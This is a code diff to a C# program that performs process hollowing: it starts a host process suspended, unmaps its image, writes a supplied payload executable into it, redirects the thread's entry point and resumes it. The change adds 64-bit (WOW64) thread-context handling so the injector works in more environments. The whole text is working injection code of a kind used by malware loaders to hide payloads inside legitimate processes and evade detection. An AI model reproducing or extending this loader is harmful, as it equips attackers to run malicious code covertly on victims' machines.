@@ -26,6 +26,10 @@ namespace ConsoleApplication1
         private static extern bool GetThreadContext(IntPtr hThread, IntPtr context);
         [DllImport("kernel32.dll")]
         private static extern bool SetThreadContext(IntPtr hThread, IntPtr context);
+        [DllImport("kernel32.dll")]
+        private static extern bool Wow64GetThreadContext(IntPtr hThread, IntPtr context);
+        [DllImport("kernel32.dll")]
+        private static extern bool Wow64SetThreadContext(IntPtr hThread, IntPtr context);
         [DllImport("ntdll.dll")]
         private static extern bool NtUnmapViewOfSection(IntPtr hProcess, IntPtr hAddr);
         [DllImport("kernel32.dll")]
@@ -38,6 +42,7 @@ namespace ConsoleApplication1
         public static void Run(string host, byte[] payload)
         {
             int written = 0;
+            bool _im64bit = IntPtr.Size * 8 == 64;
 
             // spawn the process
             IntPtr threadAttributes = Marshal.AllocHGlobal(0x44); // 0x44
@@ -47,8 +52,8 @@ namespace ConsoleApplication1
             RtlZeroMemory(threadAttributes, 0x44);
             RtlZeroMemory(processInfo, 0x10);
 
-            bool hResult = CreateProcess(null, host , IntPtr.Zero, IntPtr.Zero, true , 0x4, IntPtr.Zero, null, threadAttributes, processInfo);
-            
+            bool hResult = CreateProcess(null, host, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, threadAttributes, processInfo);
+
             // read our process handles
             IntPtr hProcess = Marshal.ReadIntPtr(processInfo);
             IntPtr hThread = Marshal.ReadIntPtr(processInfo + Marshal.SizeOf(typeof(IntPtr)));
@@ -64,25 +69,25 @@ namespace ConsoleApplication1
             // read payload details
             int e_lfanew = Marshal.ReadInt32(payload, 0x3c);
             short sizeOfOptionalHeader = Marshal.ReadInt16(payload, e_lfanew + 0x14);
-            Console.WriteLine("Size of optional header: {0}", sizeOfOptionalHeader );
+            Console.WriteLine("Size of optional header: {0}", sizeOfOptionalHeader);
 
             short numberOfSections = Marshal.ReadInt16(payload, e_lfanew + 0x6);
-            Console.WriteLine("Number of sections: {0}", numberOfSections );
+            Console.WriteLine("Number of sections: {0}", numberOfSections);
 
             int sizeOfImage = Marshal.ReadInt32(payload, e_lfanew + 0x50);
-            Console.WriteLine("Size of image: {0}", sizeOfImage );
+            Console.WriteLine("Size of image: {0}", sizeOfImage);
 
             int sizeOfHeaders = Marshal.ReadInt32(payload, e_lfanew + 0x54);
-            Console.WriteLine("Size of headers: {0}", sizeOfHeaders );
+            Console.WriteLine("Size of headers: {0}", sizeOfHeaders);
 
             int locationOfSectionHeaders = e_lfanew + 0x14 /*file header size*/ + sizeof(int) /*e_lfanew size*/ + sizeOfOptionalHeader;
-            Console.WriteLine("Location of section headers: {0}", locationOfSectionHeaders.ToString("x8") );
+            Console.WriteLine("Location of section headers: {0}", locationOfSectionHeaders.ToString("x8"));
 
             int imageBase = Marshal.ReadInt32(payload, e_lfanew + 0x34);
-            Console.WriteLine("Image base: {0}", imageBase );
+            Console.WriteLine("Image base: {0}", imageBase);
 
             int addressOfEntrypoint = Marshal.ReadInt32(payload, e_lfanew + 0x28);
-            Console.WriteLine("Entry point: {0}", addressOfEntrypoint );
+            Console.WriteLine("Entry point: {0}", addressOfEntrypoint);
 
             // unmap a view of memory 
             NtUnmapViewOfSection(hProcess, (IntPtr)imageBase);
@@ -122,13 +127,20 @@ namespace ConsoleApplication1
             Marshal.WriteInt32(threadContext, 0x10001b);
 
             // get thread context
-            GetThreadContext(hThread, threadContext);
+            if (_im64bit)
+            {
+                Wow64GetThreadContext(hThread, threadContext);
+            }
+            else
+            {
+                GetThreadContext(hThread, threadContext);
+            }
             int ebx = Marshal.ReadInt32(threadContext, 0xa4);
 
             Console.WriteLine("Ebx: {0}", ebx.ToString("x8"));
 
             // store our imagebase to a buffer
-            IntPtr newImageBase = Marshal.AllocHGlobal (0x4);
+            IntPtr newImageBase = Marshal.AllocHGlobal(0x4);
             Marshal.WriteInt32(newImageBase, imageBase);
 
             // patch the imagebase of our process
@@ -138,7 +150,15 @@ namespace ConsoleApplication1
             Marshal.WriteInt32(threadContext + 0xb0, imageBase + addressOfEntrypoint);
 
             // set thread context
-            SetThreadContext(hThread, threadContext);
+            if (_im64bit)
+            {
+                Wow64SetThreadContext(hThread, threadContext);
+            }
+            else
+            {
+                SetThreadContext(hThread, threadContext);
+            }
+
 
             // resume the thread
             ResumeThread(hThread);
